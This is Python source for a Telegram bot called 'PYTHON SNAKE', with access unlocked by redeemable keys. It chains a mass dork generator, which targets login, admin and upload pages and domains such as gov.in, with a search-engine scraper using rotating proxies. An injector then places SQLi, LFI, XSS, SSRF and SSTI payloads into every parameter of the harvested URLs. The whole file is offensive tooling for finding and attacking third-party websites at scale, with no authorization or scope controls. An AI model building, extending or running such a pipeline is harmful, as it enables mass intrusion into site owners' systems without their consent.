    await update.effective_message.reply_text(help_text(), parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:home"))


def help_text() -> str:
    th = T()
    items = [
        ("🔍", "PARSER", "dork do, 13 asli search engines se REAL URLs. Proxy rotate + strict match."),
        ("🎯", "DORKER", "page / ext / param / inurl / site / niche / mixed — 100k tak, FRESH mode ke saath."),
        ("🔑", "HQ KEYWORDS", "seed ya apne keywords do → count batao (max 100k) → scored HQ list."),
        ("🔗", "URL REVERSE", "URL paste karo → domain, path, extension, parameters + uske dorks."),
        ("💉", "INJECTOR", "67 payloads (SQLi/LFI/XSS/SSRF/redirect/SSTI) × har param."),
        ("📦", "DUMPER", "saari bani hui files — txt / json / zip."),
        ("🧅", "PROXY", "45 sources + DoH bypass + 400 parallel checker."),
        ("📊", "QUALITY", "dork/keyword ko 0-100 score + wajah."),
        ("🎲", "RANDOMIZER", "dorks shuffle + operator mutate."),
    ]
    body = []
    for emoji, name, desc in items:
        body.append("%s <b>%s</b>\n   <i>%s</i>" % (emoji, style(name, "btn"), desc))
    return (H("HELP", "kaun sa tool kya karta hai") + "\n\n"
            + ("\n\n".join(body)) + "\n\n"
            + tag("FILE UPLOAD") + "\n"
            + "Koi .txt bhejo (dorks / URLs / keywords) — bot khud pehchan ke "
              "Deep Scan, Reverse, Clean, Quality Check sab dega.\n\n"
            + tag("FRESH SYSTEM") + "\n"
            + "DORKER me 🆕 <b>FRESH DORKS</b> — pehle bane dorks skip hote hain, "
              "har baar naye dorks = fresh URLs. <code>/fresh</code> se status, "
              "<code>/fresh clear</code> se reset.\n\n"
            + tag("THEME") + "\n"
            + "Admin <code>/theme</code> se font + divider + icon badal sakta hai "
              "(%d themes).\n\n" % len(THEMES)
            + "%s <b>%s</b> — panel sirf admins ko." % (th["icon"], style("ADMIN", "btn")))


# ═══════════════════════════════════════════════════════════════════════════════
#  CALLBACK ROUTER
# ═══════════════════════════════════════════════════════════════════════════════
async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = update.effective_user.id
    data = q.data or ""
    try:
        await q.answer()
    except Exception:
        pass

    # ── captcha ──
    if data.startswith("cap:"):
        val = data.split(":", 1)[1]
        if val == "new":
            text, kb = captcha_new(context)
            try:
                await q.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            ok = int(val) == int(context.user_data.get("cap", -999))
        except Exception:
            ok = False
        if ok:
            context.user_data["verified"] = True
            try:
                USERS.setdefault(str(uid), {})["verified"] = True
                save_all()
            except Exception:
                pass
            await show_home(update, uid)
        else:
            text, kb = captcha_new(context)
            try:
                await q.edit_message_text("❌ Galat! Dobara try karo.\n\n" + text,
                                          reply_markup=kb, parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return

    # ── file actions ──
    if data.startswith("f:"):
        if not access_ok(uid):
            try:
                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            return await cb_file(update, context, data[2:])
        except Exception as exc:
            logger.exception("file action %s fail: %s", data, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass
            return

    # ── keyword actions ──
    if data.startswith("kw:"):
        if not access_ok(uid):
            try:
                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            return await cb_kw_action(update, context, data[3:])
        except Exception as exc:
            logger.exception("kw action %s fail: %s", data, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass
            return

    # ── theme ──
    if data.startswith("th:set:"):
        return await cb_theme_set(update, context, data[7:])

    # ── admin ──
    if data.startswith("a:"):
        return await admin_callback(update, context, data[2:])

    # ── tool sub-buttons (dd / pr / rd / df / px / inj) ──
    if data.startswith(("dd:", "pr:", "rd:", "df:", "px:", "inj:")):
        if not access_ok(uid):
            try:
                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            return await _route_tool_cb(update, context, data)
        except Exception as exc:
            logger.exception("tool-cb %s fail: %s", data, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass
            return

    # ── menu ──
    if not data.startswith("m:"):
        return
    tool = data[2:]
    if tool == "home":
        return await show_home(update, uid)

    # 🔑 redeem aur help bina key wale ko bhi milna chahiye
    if tool in ("redeem", "help"):
        if tool == "redeem":
            try:
                await q.edit_message_text(tool_redeem_text(), reply_markup=kb_back("m:home"),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            context.user_data["await"] = "key_redeem"
            return
        try:
            await q.edit_message_text(help_text(), reply_markup=kb_back("m:home"),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if not access_ok(uid):
        try:
            await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if tool == "help":
        try:
            await q.edit_message_text(help_text(), reply_markup=kb_back("m:home"),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if tool == "qual_done":
        return

    handler = TOOL_HANDLERS.get(tool)
    if handler:
        try:
            await handler(update, context)
        except Exception as exc:
            logger.exception("tool %s fail: %s", tool, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass


async def _route_tool_cb(update, context, data: str):
    """dd: pr: rd: df: px: inj: — in sab ka dispatcher."""
    head, _, rest = data.partition(":")
    if head == "dd":
        if rest.startswith("mode:"):
            return await cb_dork_mode(update, context, rest[5:])
        if rest == "more":
            return await cb_dork_more(update, context)
    elif head == "pr":
        if rest == "last":
            return await cb_parse_last(update, context)
        if rest == "manual":
            return await cb_parse_manual(update, context)
        if rest == "deep":
            return await cb_parse_deep(update, context)
    elif head == "rd":
        if rest == "last":
            return await cb_rand_last(update, context)
        if rest == "manual":
            return await cb_rand_manual(update, context)
    elif head == "df":
        return await cb_dump_file(update, context)
    elif head == "px":
        if rest == "run":
            return await cb_proxy_run(update, context)
        if rest == "stat":
            return await cb_proxy_stat(update, context)
        if rest == "clear":
            return await cb_proxy_clear(update, context)
    elif head == "inj":
        if rest == "last":
            return await cb_inj_last(update, context)
        if rest.startswith("cat:"):
            return await cb_inj_cat(update, context, rest[4:])
    logger.warning("unknown tool callback: %s", data)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: DORKER
# ═══════════════════════════════════════════════════════════════════════════════
DORK_MODES = {
    "page":  ("📄 PAGE-TYPES", "inurl:product.php, shop/item.php …"),
    "ext":   ("🗂 EXTENSIONS", "filetype:php, filetype:sql …"),
    "param": ("🔧 PARAMETERS", "inurl:id=, inurl:page= …"),
    "inurl": ("🔗 INURL", "inurl:, allinurl:, inurl:?id= …"),
    "site":  ("🌐 SITE", "site:gov.in inurl:login …"),
    "niche": ("🎯 NICHE", "niche ke hisaab se"),
    "mixed": ("🎲 MIXED (HQ)", "saare templates random"),
}


async def tool_dork(update, context):
    q = update.callback_query
    rows = [[InlineKeyboardButton(label, callback_data="dd:mode:" + k)]
            for k, (label, _d) in DORK_MODES.items()]
    rows.append([InlineKeyboardButton("🆕 FRESH DORKS (purane skip)", callback_data="dd:mode:fresh")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
    txt = (H("DORKER", "type chuno") + "\n\n" +
           "\n".join("%s — <i>%s</i>" % (label, desc) for label, desc in DORK_MODES.values()) +
           "\n\n<b>Count</b> agla step me (1 – %s)" % fmt(DORK_MAX) +
           "\n🆕 <b>FRESH</b> — pehle bane dorks skip honge (fresh URLs ke liye)" +
           "\n\n📚 History: <code>%s</code> dorks yaad hain" % fmt(dork_seen_count()))
    try:
        await q.edit_message_text(txt, reply_markup=RK(rows),
                                  parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_dork_mode(update, context, mode: str):
    q = update.callback_query
    fresh = False
    if mode == "fresh":
        mode, fresh = "mixed", True
    context.user_data["dork_mode"] = mode
    context.user_data["dork_fresh"] = fresh
    context.user_data.pop("dork_domain", None)
    label = DORK_MODES.get(mode, ("FRESH DORKS", ""))[0]
    if mode == "site":
        txt = (H("DORKER — SITE", "domain bhejo") + "\n\n"
               "Domain ya TLD bhejo (comma se multiple):\n"
               "<code>gov.in</code>  •  <code>.pk</code>  •  <code>example.com, gov.in</code>\n\n"
               "<i>Ya <code>auto</code> bhejo — random TLDs use honge.</i>")
        try:
            await q.edit_message_text(txt, reply_markup=kb_back("m:dork"),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        context.user_data["await"] = "dork_domain"
        return
    txt = (H("DORKER — %s" % label) + "\n\n"
           "Kitne dork chahiye? <b>Number bhejo</b> (1 – %s)\n"
           "<i>Recommended: 500 • Max: %s</i>%s"
           % (fmt(DORK_MAX), fmt(DORK_MAX),
              "\n🆕 Fresh mode: purane dorks skip" if fresh else ""))
    try:
        await q.edit_message_text(txt, reply_markup=kb_back("m:dork"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "dork_count"


async def input_dork_domain(update, context, text: str):
    dom = (text or "").strip()
    if dom.lower() in ("auto", "-"):
        dom = ""
    context.user_data["dork_domain"] = dom
    txt = (H("DORKER — SITE", dom or "auto TLD") + "\n\n"
           "Kitne dork chahiye? <b>Number bhejo</b> (1 – %s)\n"
           "<i>Ek domain se ~6,000 tak bante hain. Zyada ke liye "
           "multiple domains bhejo (comma se).</i>" % fmt(DORK_MAX))
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:dork"))
    context.user_data["await"] = "dork_count"


async def input_dork_count(update, context, text: str):
    try:
        n = int(re.sub(r"[^0-9]", "", text or "") or "500")
    except Exception:
        n = 500
    n = max(1, min(DORK_MAX, n))
    mode = context.user_data.get("dork_mode", "mixed")
    fresh = bool(context.user_data.get("dork_fresh"))
    dom = context.user_data.get("dork_domain") or ""
    niche = context.user_data.get("dork_niche") or ""
    msg = await update.effective_message.reply_text(
        "⏳ %s dorks ban rahe hain…%s" % (fmt(n), " (fresh)" if fresh else ""))
    t0 = time.time()
    res = dork_gen(mode, n=n, niche=niche, domain=dom, fresh=fresh)
    dorks = res["dorks"]
    took = time.time() - t0
    if not dorks:
        await msg.edit_text(
            "❌ Fresh mode me kuch naya nahi mila — history bhara hua hai.\n"
            "👉 <code>/freshclear</code> se history saaf karo, ya naya mode chuno.",
            parse_mode=ParseMode.HTML)
        return
    context.user_data["last_dorks"] = dorks
    context.user_data["last_dork_mode"] = mode
    context.user_data["last_dork_n"] = n
    scores = [score_dork(d)[0] for d in dorks]
    avg = sum(scores) / len(scores) if scores else 0
    path, cnt = dump_text(dorks, "dorks_" + mode, "PYTHON SNAKE — %s dorks" % mode)
    extra = ""
    if dom:
        extra = "\n🌐 Domain  : <code>%s</code>" % esc(dom[:50])
    if cnt < n:
        extra += "\n⚠️ <i>Is mode se max %s hi bane (fresh/history ke baad).</i>" % fmt(cnt)
    txt = (H("DORKER — DONE", "%s %s" % (mode, "FRESH" if fresh else "")) + "\n\n"
           "🔢 Manga     : <code>%s</code>\n"
           "✅ Bane      : <code>%s</code>\n"
           "🆕 Naye      : <code>%s</code>\n"
           "⭐ Avg score : <code>%.0f/100</code>\n"
           "📚 History   : <code>%s</code>%s\n"
           "⏱ Time      : <code>%.2fs</code>\n\n"
           "<b>Top 10:</b>\n%s"
           % (fmt(n), fmt(cnt), fmt(res["new"]), avg, fmt(res["seen"]), extra, took,
              short_list(dorks[:10], 10)))
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(txt)[:2]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    await update.effective_message.reply_text(
        "👇 Aage kya?",
        reply_markup=RK([
            [InlineKeyboardButton("🆕 AUR FRESH", callback_data="dd:more")],
            [InlineKeyboardButton("🚀 DEEP SCAN", callback_data="pr:deep"),
             InlineKeyboardButton("📥 PARSE", callback_data="m:parse")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")],
        ]))
    await send_file(update, path, "🎯 %s dorks • avg %.0f/100" % (fmt(cnt), avg))
    context.user_data.pop("await", None)


async def cb_dork_more(update, context):
    """dd:more — same mode, naya fresh batch."""
    q = update.callback_query
    mode = context.user_data.get("last_dork_mode") or "mixed"
    n = int(context.user_data.get("last_dork_n") or 500)
    dom = context.user_data.get("dork_domain") or ""
    try:
        await q.edit_message_text("🆕 Fresh batch ban raha hai… (%s × %s)" % (mode, fmt(n)),
                                  parse_mode=ParseMode.HTML)
    except Exception:
        pass
    res = dork_gen(mode, n=n, domain=dom, fresh=True)
    dorks = res["dorks"]
    if not dorks:
        try:
            await q.edit_message_text(
                "❌ Fresh batch khaali — history bhar gayi.\n"
                "👉 <code>/freshclear</code> chalao.",
                parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dork"))
        except Exception:
            pass
        return
    context.user_data["last_dorks"] = dorks
    path, cnt = dump_text(dorks, "fresh_" + mode, "PYTHON SNAKE — fresh dorks")
    scores = [score_dork(d)[0] for d in dorks]
    avg = sum(scores) / len(scores) if scores else 0
    try:
        await q.edit_message_text(
            (H("FRESH BATCH", "%s naye dorks" % fmt(cnt)) + "\n\n"
             "🆕 History me add: <code>%s</code>\n"
             "📚 Total history  : <code>%s</code>\n"
             "⭐ Avg score      : <code>%.0f/100</code>\n\n"
             "<b>Top 6:</b>\n%s" % (fmt(res["new"]), fmt(res["seen"]), avg,
                                    short_list(dorks[:6], 6))),
            parse_mode=ParseMode.HTML,
            reply_markup=RK([
                [InlineKeyboardButton("🆕 AUR FRESH", callback_data="dd:more")],
                [InlineKeyboardButton("🚀 DEEP SCAN", callback_data="pr:deep")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")],
            ]))
    except Exception:
        pass
    await send_file(update, path, "🎯 %s fresh dorks" % fmt(cnt))


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: HQ KEYWORDS
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_kw(update, context):
    q = update.callback_query
    txt = (H("HQ KEYWORD GENERATOR", "seeds ya apne keywords") + "\n\n"
           "📌 <b>Do tarike — dono chalte hain:</b>\n\n"
           "1️⃣ <b>Seed</b> bhejo (2-3 topic):\n"
           "   <code>shopify store, crypto wallet, apk download</code>\n\n"
           "2️⃣ <b>Apne keywords paste karo</b> (ek line me ek) —\n"
           "   unhi se aur naye keywords banenge\n\n"
           "➡️ Agla step: kitne chahiye (<b>max 100,000</b>)")
    try:
        await q.edit_message_text(txt, reply_markup=kb_back(), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "kw_input"


async def input_kw_input(update, context, text: str):
    """Step 1 — seeds YA keywords accept karo, phir count poochho."""
    items = [x.strip() for x in re.split(r"[\n,;|]+", text or "") if x.strip()]
    cores = kw_cores(items)
    if not cores:
        await update.effective_message.reply_text(
            "❌ Kuch samajh nahi aaya. Seeds bhejo (jaise <code>shopify store</code>)",
            parse_mode=ParseMode.HTML)
        return
    context.user_data["kw_items"] = items[:2000]
    context.user_data["kw_cores"] = cores[:800]
    cap = kw_capacity(cores)
    kind = "KEYWORDS" if len(items) > 3 else "SEEDS"
    preview = short_list(cores[:6], 6)
    txt = (H("HQ KEYWORDS — COUNT", "%d %s mile" % (len(cores), kind)) + "\n\n"
           "🔎 Detect : <b>%s</b> (%d lines)\n"
           "📊 Max    : <code>%s</code> keywords is input se\n\n"
           "<b>Preview:</b>\n%s\n\n"
           "🔢 Kitne keywords chahiye? <b>Number bhejo</b>\n"
           "<i>1 – 100,000 • Recommended: 5,000</i>"
           % (kind, len(items), fmt(min(cap, KW_MAX)), preview))
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:kw"))
    context.user_data["await"] = "kw_count"


async def input_kw_count(update, context, text: str):
    """Step 2 — count lo, generate karo, file bhejo."""
    try:
        n = int(re.sub(r"[^0-9]", "", text or "") or "5000")
    except Exception:
        n = 5000
    n = max(1, min(KW_MAX, n))
    items = context.user_data.get("kw_items") or []
    if not items:
        await update.effective_message.reply_text(
            "❌ Pehle seeds/keywords bhejo — 🏠 menu → 🔑 HQ KEYWORDS",
            reply_markup=kb_back("m:kw"))
        return
    msg = await update.effective_message.reply_text("⏳ %s keywords ban rahe hain…" % fmt(n))
    t0 = time.time()
    kws = make_keywords(items, n=n)
    took = time.time() - t0
    if not kws:
        await msg.edit_text("❌ Kuch nahi bana — seed check karo.")
        return
    qrep = kw_quality(kws)
    context.user_data["last_kws"] = kws
    context.user_data["last_kw_items"] = items
    context.user_data["last_kw_n"] = n
    path, cnt = dump_text(kws, "keywords",
                          "PYTHON SNAKE — HQ keywords (%s)" % str(items[0])[:50])
    txt = (H("HQ KEYWORDS — DONE", "%s bane" % fmt(cnt)) + "\n\n"
           "🌱 Input   : <code>%d lines</code>\n"
           "🔢 Manga   : <code>%s</code>\n"
           "✅ Bane    : <code>%s</code> unique\n"
           "⭐ Avg     : <code>%.0f/100</code>\n"
           "🔥 80+     : <code>%s</code>\n"
           "⏱ Time    : <code>%.2fs</code>\n\n"
           "<b>Top 8:</b>\n%s"
           % (len(items), fmt(n), fmt(cnt), qrep["avg"], fmt(qrep["b80"]), took,
              short_list(kws[:8], 8)))
    if cnt < n:
        txt += ("\n\n⚠️ <i>Is input se max %s hi possible the — aur seeds do to "
                "100,000 tak jayega.</i>" % fmt(cnt))
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(txt)[:2]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    await update.effective_message.reply_text(
        "👇 Aage kya?",
        reply_markup=RK([
            [InlineKeyboardButton("🎯 DORKS BANAO", callback_data="kw:dorks")],
            [InlineKeyboardButton("📊 QUALITY REPORT", callback_data="kw:qual"),
             InlineKeyboardButton("🔁 AUR (naya)", callback_data="kw:more")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="m:kw")],
        ]))
    await send_file(update, path, "🔑 %s keywords • avg %.0f/100" % (fmt(cnt), qrep["avg"]))
    context.user_data.pop("await", None)


def kw_to_dorks(kws, n: int = 3000, tld: str = "") -> list:
    """Keywords se REAL dorks banao (intitle / intext / inurl combos)."""
    out = []
    words = [str(k).strip()[:60] for k in (kws or []) if str(k).strip()][:400]
    tpl = [
        'intitle:"{k}"',
        'allintitle:"{k}"',
        'intext:"{k}"',
        'intext:"{k}" inurl:login',
        'intitle:"{k}" inurl:index',
        'intext:"{k}" filetype:pdf',
        'intitle:"{k}" ext:php',
        '"{k}" inurl:admin',
        'intext:"{k}" inurl:upload',
        'intitle:"{k}" inurl:dashboard',
    ]
    for k in words:
        for t in tpl:
            out.append(t.format(k=k))
            if len(out) >= n:
                return _uniq(out)[:n]
    if tld:
        for k in words[:200]:
            out.append('site:.%s intitle:"%s"' % (tld.strip().lstrip("."), k))
    return _uniq(out)[:n]


async def cb_kw_action(update, context, action: str):
    """kw:dorks | kw:qual | kw:more"""
    q = update.callback_query
    kws = context.user_data.get("last_kws") or []
    items = context.user_data.get("last_kw_items") or []
    if not kws and not items:
        try:
            await q.answer("Pehle keywords banao", show_alert=True)
        except Exception:
            pass
        return

    if action == "dorks":
        msg = await update.effective_message.reply_text("🎯 Keywords se dorks ban rahe hain…")
        dorks = kw_to_dorks(kws or items, n=4000)
        if not dorks:
            await msg.edit_text("❌ Kuch nahi bana.")
            return
        context.user_data["last_dorks"] = dorks
        added = dork_seen_add(dorks)
        path, cnt = dump_text(dorks, "kw_dorks", "PYTHON SNAKE — keyword dorks")
        try:
            await msg.delete()
        except Exception:
            pass
        await update.effective_message.reply_text(
            (H("KEYWORDS ➪ DORKS", "%s dorks" % fmt(cnt)) + "\n\n"
             "🎯 Source keywords : <code>%s</code>\n"
             "🆕 Fresh added     : <code>%s</code>\n\n"
             "<b>Top 8:</b>\n%s" % (fmt(min(len(kws or items), 400)), fmt(added),
                                    short_list(dorks[:8], 8))),
            parse_mode=ParseMode.HTML,
            reply_markup=RK([
                [InlineKeyboardButton("🚀 DEEP SCAN", callback_data="pr:deep")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:kw")],
            ]))
        await send_file(update, path, "🎯 %s dorks" % fmt(cnt))
        return

    if action == "qual":
        qrep = kw_quality(kws)
        hq = [k for k in kws if score_keyword(k)[0] >= 80]
        txt = (H("KEYWORD QUALITY", "avg %.0f/100" % qrep["avg"]) + "\n\n"
               "📦 Total : <code>%s</code>\n\n"
               "🔥 80+   : <code>%s</code>\n"
               "✅ 65-79 : <code>%s</code>\n"
               "🟡 45-64 : <code>%s</code>\n"
               "🟠 25-44 : <code>%s</code>\n"
               "🔴 <25   : <code>%s</code>\n\n"
               "<b>Top 5:</b>\n%s\n"
               "<b>Sabse kamzor:</b>\n%s"
               % (fmt(qrep["total"]), fmt(qrep["b80"]), fmt(qrep["b65"]),
                  fmt(qrep["b45"]), fmt(qrep["b25"]), fmt(qrep["b0"]),
                  short_list(qrep["top"][:5], 5), short_list(qrep["worst"], 5)))
        try:
            await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                      reply_markup=kb_back("m:kw"))
        except Exception:
            pass
        if hq:
            path, cnt = dump_text(hq, "keywords_hq", "PYTHON SNAKE — HQ only (80+)")
            await send_file(update, path, "🔥 %s HQ keywords (80+)" % fmt(cnt))
        return

    if action == "more":
        n = int(context.user_data.get("last_kw_n") or 5000)
        msg = await update.effective_message.reply_text("🔁 Naya batch ban raha hai…")
        extra = make_keywords(items, n=n, exclude=set(kws))
        took_note = ""
        if extra:
            context.user_data["last_kws"] = extra
            path, cnt = dump_text(extra, "keywords", "PYTHON SNAKE — fresh keywords")
            try:
                await msg.delete()
            except Exception:
                pass
            await update.effective_message.reply_text(
                (H("FRESH BATCH", "%s naye keywords" % fmt(cnt)) + "\n\n"
                 "🆕 Purane %s skip kiye\n\n<b>Top 6:</b>\n%s"
                 % (fmt(len(kws)), short_list(extra[:6], 6))),
                parse_mode=ParseMode.HTML,
                reply_markup=RK([
                    [InlineKeyboardButton("📊 QUALITY", callback_data="kw:qual"),
                     InlineKeyboardButton("🔁 AUR", callback_data="kw:more")],
                    [InlineKeyboardButton("⬅️ BACK", callback_data="m:kw")],
                ]))
            await send_file(update, path, "🔑 %s fresh keywords" % fmt(cnt))
        else:
            took_note = "❌ Is input ki capacity khatam. Naye seeds do."
            await msg.edit_text(took_note)
        return


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: URL REVERSE
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_rev(update, context):
    q = update.callback_query
    txt = (H("URL REVERSE") + "\n\n"
           "URL(s) paste karo — ek line me ek:\n\n"
           "<code>https://shop.example.com/product.php?id=12&cat=5</code>\n\n"
           "Main domain, path, extension, parameters nikaal ke dorks bana dunga.")
    try:
        await q.edit_message_text(txt, reply_markup=kb_back(), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "rev_urls"


async def input_rev_urls(update, context, text: str):
    urls = [x.strip() for x in re.split(r"[\s,]+", text) if x.strip()][:20]
    infos = [url_reverse(u) for u in urls]
    infos = [i for i in infos if i]
    if not infos:
        await update.effective_message.reply_text("❌ Koi valid URL nahi mila.")
        return
    lines = []
    all_dorks = []
    for i in infos:
        d = url_reverse_dorks(i, n=12)
        all_dorks += d
        lines.append("<b>%s</b>\n• host : <code>%s</code>\n• file : <code>%s</code>\n"
                     "• ext  : <code>%s</code>\n• params: <code>%s</code>\n• dorks: <code>%d</code>"
                     % (esc(i["host"] or "?"), esc(i["host"]), esc(i["file"] or "—"),
                        esc(i["ext"] or "—"), esc(", ".join(i["params"]) or "—"), len(d)))
    all_dorks = _uniq(all_dorks)
    path, cnt = dump_text(all_dorks, "url_reverse",
                          "PYTHON SNAKE — URL reverse dorks\n" + "\n".join(u for u in urls))
    body = (H("URL REVERSE — DONE") + "\n\n" + "\n\n".join(lines[:8]) +
            "\n\n🔗 <b>Total dorks</b>: <code>%d</code>\n\n%s" % (cnt, short_list(all_dorks[:10], 10)))
    parts = chunk_lines(body)
    for i, ch in enumerate(parts[:2]):
        await update.effective_message.reply_text(
            ch, parse_mode=ParseMode.HTML,
            reply_markup=kb_back("m:rev") if i == min(len(parts), 2) - 1 else None)
    await send_file(update, path, "🔗 %d reverse dorks" % cnt)
    context.user_data.pop("await", None)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: INJECTOR
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_inj(update, context):
    q = update.callback_query
    cat = context.user_data.get("inj_cat", "all")
    rows = []
    keys = list(CAT_LABEL.keys())
    for i in range(0, len(keys), 3):
        row = []
        for k in keys[i:i + 3]:
            label = CAT_LABEL[k] + ("  ✅" if k == cat else "")
            row.append(InlineKeyboardButton(label, callback_data="inj:cat:" + k))
        rows.append(row)
    rows.append([InlineKeyboardButton("📥 LAST PARSER RESULTS", callback_data="inj:last")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
    txt = (H("INJECTOR", "%d payloads • %d categories" % (len(PAYLOADS), len(PAYLOAD_CATS))) + "\n\n"
           "Category chuno: <b>%s</b> (%d payloads)\n\n"
           "Phir URLs bhejo — har param me payload daal ke test URLs banaunga.\n\n"
           "<code>https://target.com/product.php?id=1</code>"
           % (CAT_LABEL.get(cat, cat), len(payloads_for(cat))))
    try:
        await q.edit_message_text(txt, reply_markup=RK(rows),
                                  parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "inj_urls"


async def cb_inj_cat(update, context, cat: str):
    context.user_data["inj_cat"] = cat if cat in CAT_LABEL else "all"
    return await tool_inj(update, context)


async def cb_inj_last(update, context):
    q = update.callback_query
    urls = context.user_data.get("last_urls") or []
    if not urls:
        try:
            await q.answer("Pehle PARSER chalao", show_alert=True)
        except Exception:
            pass
        return
    await _run_inject(update, context, urls)


async def input_inj_urls(update, context, text: str):
    urls = [x.strip() for x in re.split(r"[\s,]+", text) if x.strip().startswith("http")]
    if not urls:
        await update.effective_message.reply_text("❌ Koi http URL nahi mila.")
        return
    await _run_inject(update, context, urls[:200])


async def _run_inject(update, context, urls):
    cat = context.user_data.get("inj_cat", "all")
    msg = None
    try:
        msg = await update.effective_message.reply_text("💉 Targets ban rahe hain…")
    except Exception:
        pass
    t0 = time.time()
    out = inject_all_payloads(urls, cat)
    took = time.time() - t0
    if not out:
        if msg:
            try:
                await msg.edit_text("❌ Kuch nahi bana.")
            except Exception:
                pass
        return
    path, cnt = dump_text(out, "inject_" + cat, "PYTHON SNAKE — injector (%s)" % cat)
    txt = (H("INJECTOR — DONE", CAT_LABEL.get(cat, cat)) + "\n\n"
           "🎯 Input URLs : <code>%s</code>\n"
           "💉 Payloads   : <code>%d</code>\n"
           "✅ Targets    : <code>%s</code>\n"
           "⏱ Time       : <code>%.2fs</code>\n\n%s"
           % (fmt(len(urls)), len(payloads_for(cat)), fmt(cnt), took, short_list(out[:8], 8)))
    if msg:
        try:
            await msg.delete()
        except Exception:
            pass
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:inj"))
    await send_file(update, path, "💉 %d %s targets" % (cnt, cat))
    context.user_data.pop("await", None)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: PARSER
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_parse(update, context):
    q = update.callback_query
    last = context.user_data.get("last_dorks") or []
    kb = RK([
        [InlineKeyboardButton("🚀 DEEP SCAN (LAST DORKS)", callback_data="pr:deep")],
        [InlineKeyboardButton("📥 USE LAST %d DORKS" % len(last), callback_data="pr:last")],
        [InlineKeyboardButton("✍️ MANUAL DORK", callback_data="pr:manual")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    txt = (H("PARSER", "asli engines = asli URLs") + "\n\n"
           "Engines: DDG • Bing • Mojeek • Yahoo • Brave • Startpage • Google\n"
           "🐦 Free Google: %s\n"
           "Proxy: %s\n\n"
           "Dork list bhejo (ek line me ek) — ya upar se LAST DORKS chuno."
           % ("✅ ON (no key)" if gj_enabled() else "⚪ OFF",
              "✅ %d ready" % len(PROXIES or load_proxy_pool()) if (PROXIES or load_proxy_pool()) else "⚪ none (no-proxy mode)"))
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_parse_last(update, context):
    q = update.callback_query
    dorks = context.user_data.get("last_dorks") or []
    if not dorks:
        try:
            await q.answer("Pehle DORKER chalao", show_alert=True)
        except Exception:
            pass
        return
    context.user_data["parse_dorks"] = dorks[:30]
    try:
        await q.edit_message_text(H("PARSER") + "\n\nKitne URLs chahiye? <b>Number bhejo</b>\n"
                                  "<i>Recommended: 100</i>", parse_mode=ParseMode.HTML,
                                  reply_markup=kb_back("m:parse"))
    except Exception:
        pass
    context.user_data["await"] = "parse_max"


async def cb_parse_manual(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(H("PARSER — MANUAL") + "\n\nDork(s) bhejo (ek line me ek):",
                                  parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
    except Exception:
        pass
    context.user_data["await"] = "parse_dorks"


async def cb_parse_deep(update, context):
    q = update.callback_query
